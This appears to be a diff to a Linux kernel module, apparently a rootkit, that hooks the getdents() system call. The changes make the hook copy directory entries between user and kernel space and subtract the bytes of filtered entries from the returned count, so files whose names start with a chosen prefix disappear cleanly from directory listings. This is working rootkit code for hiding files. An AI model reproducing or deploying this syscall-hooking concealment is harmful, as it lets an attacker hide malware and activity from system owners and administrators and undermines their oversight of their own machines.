@@ -323,6 +323,7 @@ asmlinkage int new_getdents(unsigned int fd, struct linux_dirent *dirp,
   struct linux_dirent *d = NULL;
   char *user_buf = /*(char *) dirp*/ NULL;
   char starts_with_prefix = 0;
+  unsigned int num_bytes_hidden = 0;
 
   printk(KERN_ALERT "getdents() hook invoked for %s.\n", current->comm);
 
@@ -337,14 +338,18 @@ asmlinkage int new_getdents(unsigned int fd, struct linux_dirent *dirp,
 
   user_buf = (char *) dirp;
 
+#pragma GCC diagnostic push
 #pragma GCC diagnostic ignored "-Wdeclaration-after-statement"
   char k_buf[count];
 #pragma GCC diagnostic pop
 
-  // Fill k_buf with 0x00 bytes
-  for (i = 0; i < count; ++i) {
-    k_buf[i] = 0x00;
-  }
+  //// Fill k_buf with 0x00 bytes
+  //for (i = 0; i < count; ++i) {
+  //  k_buf[i] = 0x00;
+  //}
+
+  // Copy user space buffer to kernel land buffer
+  copy_from_user(k_buf, dirp, count);
 
   for (bpos = 0; bpos < (unsigned int)nread;) {
     d = (struct linux_dirent *) (user_buf + bpos);
@@ -357,15 +362,20 @@ asmlinkage int new_getdents(unsigned int fd, struct linux_dirent *dirp,
       for (i = bpos; i < bpos + d->d_reclen; ++i) {
         k_buf[j++] = user_buf[i];
       }
+    } else {
+      num_bytes_hidden += d->d_reclen;
     }
 
     bpos += d->d_reclen;
   }
 
-  // Copy k_buf to user_buf - user_buf == dirp
-  for (i = 0; i < count; ++i) {
-    user_buf[i] = k_buf[i];
-  }
+  //// Copy k_buf to user_buf - user_buf == dirp
+  //for (i = 0; i < count; ++i) {
+  //  user_buf[i] = k_buf[i];
+  //}
 
-  return nread;
+  // Copy kernel land buffer to user space buffer
+  copy_to_user(dirp, k_buf, count);
+
+  return nread - num_bytes_hidden;
 }
